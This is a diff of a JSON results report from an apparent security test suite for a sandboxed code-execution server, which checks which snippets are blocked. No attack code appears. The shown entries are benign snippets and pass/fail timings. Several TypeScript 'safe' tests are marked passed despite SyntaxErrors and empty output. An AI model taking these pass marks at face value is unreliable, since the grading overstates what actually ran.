@@ -2,15 +2,15 @@
   "suite": "security",
   "version": "2.0",
   "description": "Educational Security Test Report - Learn how hackers exploit code execution vulnerabilities",
-  "timestamp": "2026-01-06T20:21:01.413Z",
+  "timestamp": "2026-01-06T18:46:49.208Z",
   "server": "http://localhost:3001",
   "summary": {
     "total": 258,
-    "passed": 258,
-    "failed": 0,
+    "passed": 248,
+    "failed": 10,
     "errors": 0,
-    "passRate": "100.00%",
-    "duration": 13921
+    "passRate": "96.12%",
+    "duration": 3405
   },
   "statistics": {
     "byLanguage": {
@@ -31,13 +31,13 @@
       },
       "php": {
         "total": 70,
-        "passed": 70,
-        "failed": 0
+        "passed": 65,
+        "failed": 5
       },
       "java": {
         "total": 46,
-        "passed": 46,
-        "failed": 0
+        "passed": 41,
+        "failed": 5
       }
     },
     "byCategory": {
@@ -108,8 +108,8 @@
       },
       "safe_code": {
         "total": 24,
-        "passed": 24,
-        "failed": 0
+        "passed": 14,
+        "failed": 10
       },
       "type_abuse": {
         "total": 4,
@@ -196,7 +196,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 257,
+      "duration": 120,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -213,7 +213,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 15,
+      "duration": 78,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -230,7 +230,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 16,
+      "duration": 9,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -247,7 +247,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 66,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -264,7 +264,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 17,
+      "duration": 10,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -281,7 +281,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 14,
+      "duration": 69,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -298,7 +298,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 68,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -315,7 +315,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -332,7 +332,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 7,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -349,7 +349,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 8,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -366,7 +366,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 73,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -383,7 +383,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 74,
+      "duration": 15,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -400,7 +400,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 13,
+      "duration": 16,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -417,7 +417,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 10,
+      "duration": 71,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -434,7 +434,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 15,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -451,7 +451,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 15,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -468,7 +468,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -485,7 +485,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 12,
+      "duration": 61,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -502,7 +502,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 10,
+      "duration": 7,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -519,7 +519,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 12,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -536,7 +536,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 7,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -553,7 +553,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 64,
+      "duration": 13,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -570,7 +570,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 64,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -587,7 +587,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -604,7 +604,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -638,7 +638,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 7,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -655,7 +655,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -672,7 +672,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -689,7 +689,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -706,7 +706,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 7,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -723,7 +723,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -740,7 +740,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 68,
+      "duration": 65,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -774,7 +774,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 8,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -791,7 +791,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -808,7 +808,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 72,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -825,7 +825,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -842,7 +842,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -859,7 +859,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -876,7 +876,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 64,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -893,7 +893,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 7,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -910,7 +910,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -927,7 +927,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -944,7 +944,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -961,7 +961,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 7,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -978,7 +978,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 62,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -995,7 +995,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 12,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1012,7 +1012,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1029,7 +1029,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 62,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1080,11 +1080,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 408,
+      "duration": 163,
       "result": {
         "blocked": false,
         "stdout": "Hello, World!",
-        "stderr": "(node:644) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
+        "stderr": "(node:48) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
       },
       "code": "console.log('Hello, World!');",
       "explanation": "\n      ✅ SAFE: Basic Console Output\n      \n      This is legitimate code that should execute:\n      Simple console output is the foundation of learning to code\n      and debugging. No security risk.\n    "
@@ -1096,11 +1096,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 355,
+      "duration": 142,
       "result": {
         "blocked": false,
         "stdout": "4",
-        "stderr": "(node:650) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
+        "stderr": "(node:54) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
       },
       "code": "console.log(2 + 2);",
       "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic operations are fundamental to programming\n      and pose no security risk.\n    "
@@ -1112,11 +1112,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 89,
+      "duration": 63,
       "result": {
         "blocked": false,
         "stdout": "2,4,6",
-        "stderr": "(node:656) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
+        "stderr": "(node:60) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
       },
       "code": "const arr = [1,2,3].map(x => x * 2); console.log(arr.join(','));",
       "explanation": "\n      ✅ SAFE: Array Methods\n      \n      This is legitimate code that should execute:\n      Array manipulation methods like map, filter, and join are\n      essential for data processing.\n    "
@@ -1128,11 +1128,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 82,
+      "duration": 83,
       "result": {
         "blocked": false,
         "stdout": "done",
-        "stderr": "(node:662) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
+        "stderr": "(node:66) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)"
       },
       "code": "const delay = ms => new Promise(r => setTimeout(r, ms)); await delay(10); console.log('done');",
       "explanation": "\n      ✅ SAFE: Async/Await Patterns\n      \n      This is legitimate code that should execute:\n      Promise-based async code with short delays is common and safe.\n      Teaching async patterns is important.\n    "
@@ -1178,7 +1178,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1229,7 +1229,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1246,7 +1246,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1263,7 +1263,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1280,7 +1280,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 13,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1297,7 +1297,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1314,7 +1314,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 14,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1365,7 +1365,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1382,7 +1382,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 1,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1399,7 +1399,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1416,7 +1416,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 8,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1433,7 +1433,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1450,7 +1450,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1467,11 +1467,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed successfully (not blocked by security)",
-      "duration": 340,
+      "duration": 79,
       "result": {
         "blocked": false,
         "stdout": "",
-        "stderr": "(node:668) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nconst add = (a: number, b: number): number => a + b; console.log(add(2, 3));\n              ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
+        "stderr": "(node:72) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nconst add = (a: number, b: number): number => a + b; console.log(add(2, 3));\n              ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
       },
       "code": "const add = (a: number, b: number): number => a + b; console.log(add(2, 3));",
       "explanation": "\n      ✅ SAFE: Typed Mathematical Function\n      \n      This is legitimate code that should NOT be blocked:\n      Type-annotated functions performing safe operations\n      are exactly what TypeScript is designed for.\n      \n      Note: Actual execution requires TypeScript transpilation,\n      which is a runtime concern separate from security filtering.\n    "
@@ -1483,11 +1483,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed successfully (not blocked by security)",
-      "duration": 130,
+      "duration": 60,
       "result": {
         "blocked": false,
         "stdout": "",
-        "stderr": "(node:674) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\ninterface Point { x: number; y: number; }\n^^^^^^^^^\n\nSyntaxError: Unexpected strict mode reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
+        "stderr": "(node:78) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\ninterface Point { x: number; y: number; }\n^^^^^^^^^\n\nSyntaxError: Unexpected strict mode reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
       },
       "code": "interface Point { x: number; y: number; }\nconst p: Point = { x: 10, y: 20 };\nconsole.log(p.x + p.y);",
       "explanation": "\n      ✅ SAFE: Interface-Based Data Structures\n      \n      This is legitimate code that should NOT be blocked:\n      Defining and using interfaces for type safety is\n      core TypeScript functionality.\n    "
@@ -1499,11 +1499,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed successfully (not blocked by security)",
-      "duration": 198,
+      "duration": 69,
       "result": {
         "blocked": false,
         "stdout": "",
-        "stderr": "(node:680) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nfunction identity<T>(value: T): T { return value; }\n                 ^\n\nSyntaxError: Unexpected token '<'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
+        "stderr": "(node:84) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nfunction identity<T>(value: T): T { return value; }\n                 ^\n\nSyntaxError: Unexpected token '<'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
       },
       "code": "function identity<T>(value: T): T { return value; }\nconsole.log(identity('hello'));",
       "explanation": "\n      ✅ SAFE: Generic Identity Function\n      \n      This is legitimate code that should NOT be blocked:\n      Generics without dangerous operations are safe\n      and fundamental to TypeScript development.\n    "
@@ -1515,11 +1515,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed successfully (not blocked by security)",
-      "duration": 228,
+      "duration": 76,
       "result": {
         "blocked": false,
         "stdout": "",
-        "stderr": "(node:686) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:2\n  add(a: number, b: number): number { return a + b; }\n       ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
+        "stderr": "(node:90) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:2\n  add(a: number, b: number): number { return a + b; }\n       ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
       },
       "code": "class Calculator {\n  add(a: number, b: number): number { return a + b; }\n}\nconst calc = new Calculator();\nconsole.log(calc.add(5, 3));",
       "explanation": "\n      ✅ SAFE: Class with Typed Methods\n      \n      This is legitimate code that should NOT be blocked:\n      Object-oriented TypeScript with proper typing\n      is standard practice for application development.\n    "
@@ -1531,11 +1531,11 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed successfully (not blocked by security)",
-      "duration": 109,
+      "duration": 62,
       "result": {
         "blocked": false,
         "stdout": "",
-        "stderr": "(node:692) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nenum Color { Red, Green, Blue }\n^^^^\n\nSyntaxError: Unexpected reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
+        "stderr": "(node:96) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nenum Color { Red, Green, Blue }\n^^^^\n\nSyntaxError: Unexpected reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6"
       },
       "code": "enum Color { Red, Green, Blue }\nconsole.log(Color.Green);",
       "explanation": "\n      ✅ SAFE: Enum Definition and Usage\n      \n      This is legitimate code that should NOT be blocked:\n      Enums are a TypeScript feature for defining\n      named constants. Completely safe.\n    "
@@ -1564,7 +1564,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1598,7 +1598,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1615,7 +1615,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 19,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1649,7 +1649,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1666,7 +1666,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1683,7 +1683,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1700,7 +1700,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1717,7 +1717,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 31,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1734,7 +1734,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1751,7 +1751,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1768,7 +1768,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1785,7 +1785,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1802,7 +1802,7 @@
       "expectBlocked": true,
